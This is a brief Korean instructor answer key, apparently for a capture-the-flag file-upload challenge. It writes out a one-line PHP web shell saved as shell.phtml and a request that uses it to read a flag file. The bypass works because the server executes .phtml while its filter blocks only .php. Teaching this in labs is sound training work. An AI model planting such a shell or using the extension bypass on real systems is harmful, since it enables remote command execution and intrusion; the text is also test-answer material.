# [강사용] Upload→웹쉘
`shell.phtml` (`<?php system($_GET[0]); ?>`) 업로드 → `uploads/shell.phtml?0=cat /flag_upload.txt`. (서버가 .phtml·.php5 를 PHP 로 실행하도록 매핑되어 있고, 확장자 필터는 `.php` 만 차단)
